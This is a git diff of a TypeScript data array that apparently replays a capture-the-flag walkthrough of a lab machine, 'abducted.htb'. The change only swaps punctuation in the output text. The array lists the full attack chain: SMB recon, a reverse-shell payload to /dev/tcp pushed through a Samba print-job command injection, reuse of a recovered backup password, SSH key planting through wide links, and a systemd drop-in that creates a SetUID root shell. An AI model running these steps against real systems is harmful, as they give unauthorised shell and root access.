@@ -35,18 +35,18 @@ const START = Date.parse("2026-07-07T19:00:00Z");
 
 const STEPS: Step[] = [
   // --- Recon: ports, NetBIOS, SMB shares, RPC null-session ---
-  { cmd: "nmap -p- --min-rate 10000 abducted.htb", gap: 2_000, dur: 48_000, lines: 9, volume: 2000, out: "22/tcp ssh · 139/tcp netbios-ssn · 445/tcp microsoft-ds — full TCP sweep" },
-  { cmd: "nmap -p 22,139,445 -sCV abducted.htb", gap: 15_000, dur: 22_000, lines: 18, volume: 100, out: "22/tcp OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 · 139,445/tcp Samba smbd 4.6.2 — looks like Ubuntu 24.04 LTS" },
-  { cmd: "nmblookup -A abducted.htb", gap: 20_000, dur: 3_000, lines: 7, out: "ABDUCTED <00><03><20> B · WORKGROUP <00><1d><1e> — <20> set, File Server Service is up" },
-  { cmd: "smbclient -L //abducted.htb/ -N", gap: 12_000, dur: 3_500, lines: 9, out: "HP-Reception (Printer) · projects (Disk) · transfer (Disk) · IPC$ — anonymous listing succeeds" },
-  { cmd: 'rpcclient -N abducted.htb -U "" -c enumdomusers', gap: 10_000, dur: 2_200, lines: 1, out: "user:[scott] rid:[0x3e8] — single domain user, null session" },
+  { cmd: "nmap -p- --min-rate 10000 abducted.htb", gap: 2_000, dur: 48_000, lines: 9, volume: 2000, out: "22/tcp ssh · 139/tcp netbios-ssn · 445/tcp microsoft-ds · full TCP sweep" },
+  { cmd: "nmap -p 22,139,445 -sCV abducted.htb", gap: 15_000, dur: 22_000, lines: 18, volume: 100, out: "22/tcp OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 · 139,445/tcp Samba smbd 4.6.2 · looks like Ubuntu 24.04 LTS" },
+  { cmd: "nmblookup -A abducted.htb", gap: 20_000, dur: 3_000, lines: 7, out: "ABDUCTED <00><03><20> B · WORKGROUP <00><1d><1e> · <20> set, File Server Service is up" },
+  { cmd: "smbclient -L //abducted.htb/ -N", gap: 12_000, dur: 3_500, lines: 9, out: "HP-Reception (Printer) · projects (Disk) · transfer (Disk) · IPC$ · anonymous listing succeeds" },
+  { cmd: 'rpcclient -N abducted.htb -U "" -c enumdomusers', gap: 10_000, dur: 2_200, lines: 1, out: "user:[scott] rid:[0x3e8] · single domain user, null session" },
   { cmd: 'rpcclient -N abducted.htb -U "" -c netshareenumall', gap: 6_000, dur: 2_600, lines: 9, out: "HP-Reception -> C:\\var\\spool\\samba · projects -> C:\\srv\\projects · transfer -> C:\\srv\\transfer" },
 
   // --- Exploitation: CVE-2026-4480, Samba print-job command injection ---
-  { cmd: "echo 'bash -i >& /dev/tcp/x.x.x.x/443 0>&1' > '|bash'", gap: 240_000, dur: 400, lines: 1, out: "payload written — the print command forwards the job description through %J unescaped (CVE-2026-4480)" },
+  { cmd: "echo 'bash -i >& /dev/tcp/x.x.x.x/443 0>&1' > '|bash'", gap: 240_000, dur: 400, lines: 1, out: "payload written · the print command forwards the job description through %J unescaped (CVE-2026-4480)" },
   { cmd: "nc -lnvp 443", gap: 8_000, dur: 600, lines: 1, out: "listening on [any] 443 ..." },
-  { cmd: 'smbclient //abducted.htb/HP-Reception -N -c \'print "|bash"\'', gap: 5_000, dur: 2_800, lines: 2, out: 'putting file |bash as the print job — job description runs as a shell command · nobody@abducted:/var/spool/samba$ (caught on the listener)' },
-  { cmd: "script /dev/null -c bash", gap: 6_000, dur: 1_800, lines: 1, out: "nobody@abducted:/var/spool/samba$ — upgraded to a full tty" },
+  { cmd: 'smbclient //abducted.htb/HP-Reception -N -c \'print "|bash"\'', gap: 5_000, dur: 2_800, lines: 2, out: 'putting file |bash as the print job · job description runs as a shell command · nobody@abducted:/var/spool/samba$ (caught on the listener)' },
+  { cmd: "script /dev/null -c bash", gap: 6_000, dur: 1_800, lines: 1, out: "nobody@abducted:/var/spool/samba$ · upgraded to a full tty" },
   { cmd: "whoami", gap: 4_000, dur: 300, lines: 1, out: "nobody" },
   { cmd: "id", gap: 2_500, dur: 300, lines: 1, out: "uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)" },
 
@@ -54,23 +54,23 @@ const STEPS: Step[] = [
   { cmd: "cat /etc/passwd | grep 'sh$'", gap: 25_000, dur: 700, lines: 3, out: "root:x:0:0:root:/root:/bin/bash · scott:x:1000:1001:Scott Mercer:/home/scott:/bin/bash · marcus:x:1001:1002:Marcus Vale:/home/marcus:/bin/bash" },
   { cmd: "ls /opt/offsite-backup", gap: 35_000, dur: 500, lines: 2, out: "rclone.conf  sync.sh" },
   { cmd: "cat /opt/offsite-backup/rclone.conf", gap: 4_000, dur: 400, lines: 5, out: "[offsite] type = sftp · host = backup.hartley-group.internal · user = svc-backup · pass = [redacted] (rclone-obscured)" },
-  { cmd: "rclone reveal [redacted]", gap: 15_000, dur: 700, lines: 1, out: "[redacted] — plaintext offsite-backup password" },
-  { cmd: "su - scott", gap: 10_000, dur: 2_000, lines: 2, out: "Password: [redacted] · scott@abducted:~$ — the offsite-backup password is reused for the local account" },
+  { cmd: "rclone reveal [redacted]", gap: 15_000, dur: 700, lines: 1, out: "[redacted] · plaintext offsite-backup password" },
+  { cmd: "su - scott", gap: 10_000, dur: 2_000, lines: 2, out: "Password: [redacted] · scott@abducted:~$ · the offsite-backup password is reused for the local account" },
   { cmd: "cat user.txt", gap: 90_000, dur: 400, lines: 1, out: "[redacted-flag]" },
 
   // --- Privesc to marcus: Samba wide-links + force user, SSH key injection ---
   { cmd: "cat /etc/samba/shares.conf", gap: 60_000, dur: 900, lines: 8, out: "[transfer] valid users = scott · force user = marcus · read only = no · wide links = yes · (global) allow insecure wide links = yes" },
-  { cmd: "ln -s /home/marcus /srv/transfer/marcus-link", gap: 30_000, dur: 400, lines: 1, out: "symlink created — wide links + force user=marcus lets the link resolve outside the share root" },
-  { cmd: "smbclient //abducted.htb/transfer -U scott%[redacted] -c 'mkdir marcus-link/.ssh; put id_ed25519.pub marcus-link/.ssh/authorized_keys'", gap: 20_000, dur: 3_200, lines: 3, out: "putting id_ed25519.pub as marcus-link\\.ssh\\authorized_keys — written to disk as marcus (force user)" },
-  { cmd: "ssh -o IdentityFile=./id_ed25519 marcus@abducted.htb", gap: 25_000, dur: 2_500, lines: 1, out: "marcus@abducted:~$ — key-based login, no password needed" },
-  { cmd: "id", gap: 3_000, dur: 300, lines: 1, out: "uid=1001(marcus) gid=1002(marcus) groups=1002(marcus),1000(operators) — marcus is in the operators group" },
+  { cmd: "ln -s /home/marcus /srv/transfer/marcus-link", gap: 30_000, dur: 400, lines: 1, out: "symlink created · wide links + force user=marcus lets the link resolve outside the share root" },
+  { cmd: "smbclient //abducted.htb/transfer -U scott%[redacted] -c 'mkdir marcus-link/.ssh; put id_ed25519.pub marcus-link/.ssh/authorized_keys'", gap: 20_000, dur: 3_200, lines: 3, out: "putting id_ed25519.pub as marcus-link\\.ssh\\authorized_keys · written to disk as marcus (force user)" },
+  { cmd: "ssh -o IdentityFile=./id_ed25519 marcus@abducted.htb", gap: 25_000, dur: 2_500, lines: 1, out: "marcus@abducted:~$ · key-based login, no password needed" },
+  { cmd: "id", gap: 3_000, dur: 300, lines: 1, out: "uid=1001(marcus) gid=1002(marcus) groups=1002(marcus),1000(operators) · marcus is in the operators group" },
 
   // --- Root: writable systemd drop-in for smbd (operators group), SetUID shell ---
-  { cmd: "ls -ld /etc/systemd/system/smbd.service.d/", gap: 40_000, dur: 500, lines: 1, out: "drwxrwxr-x 2 root operators 4096 ... — group-writable by operators" },
-  { cmd: 'echo -e \'[Service]\\nExecStartPre=-/bin/bash -c "cp /bin/bash /tmp/.rootbash; chmod 6777 /tmp/.rootbash"\' > /etc/systemd/system/smbd.service.d/override.conf', gap: 45_000, dur: 600, lines: 1, out: "drop-in written — ExecStartPre runs as root the next time smbd (re)starts" },
+  { cmd: "ls -ld /etc/systemd/system/smbd.service.d/", gap: 40_000, dur: 500, lines: 1, out: "drwxrwxr-x 2 root operators 4096 ... · group-writable by operators" },
+  { cmd: 'echo -e \'[Service]\\nExecStartPre=-/bin/bash -c "cp /bin/bash /tmp/.rootbash; chmod 6777 /tmp/.rootbash"\' > /etc/systemd/system/smbd.service.d/override.conf', gap: 45_000, dur: 600, lines: 1, out: "drop-in written · ExecStartPre runs as root the next time smbd (re)starts" },
   { cmd: "systemctl daemon-reload", gap: 6_000, dur: 900, lines: 0, out: "unit files reloaded" },
-  { cmd: "systemctl restart smbd", gap: 4_000, dur: 2_400, lines: 1, out: "smbd restarted — ExecStartPre ran as root; /tmp/.rootbash is now a SetUID root bash" },
-  { cmd: "/tmp/.rootbash -p", gap: 8_000, dur: 500, lines: 1, out: "bash-5.2# — SetUID shell spawned" },
+  { cmd: "systemctl restart smbd", gap: 4_000, dur: 2_400, lines: 1, out: "smbd restarted · ExecStartPre ran as root; /tmp/.rootbash is now a SetUID root bash" },
+  { cmd: "/tmp/.rootbash -p", gap: 8_000, dur: 500, lines: 1, out: "bash-5.2# · SetUID shell spawned" },
   { cmd: "whoami", gap: 2_000, dur: 300, lines: 1, out: "root" },
   { cmd: "cat root.txt", gap: 6_000, dur: 400, lines: 1, out: "[redacted-flag]" },
 ];
